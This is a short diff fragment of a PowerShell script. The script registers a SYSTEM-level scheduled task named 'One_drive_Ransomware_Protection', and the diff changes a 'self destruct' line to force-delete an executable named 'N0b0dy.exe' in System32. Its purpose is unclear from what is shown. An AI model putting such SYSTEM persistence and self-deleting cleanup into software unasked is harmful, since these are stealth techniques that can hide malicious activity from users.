@@ -5,4 +5,4 @@ $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType
 # register scheduled task
 Register-ScheduledTask -TaskName "One_drive_Ransomware_Protection" -Action $action -Trigger $trigger -Principal $principal
 # self destruct
-Remove-Item -Path $MyInvocation.MyCommand.Source -Force
+Remove-Item -Path "C:\Windows\System32\N0b0dy.exe" -Force
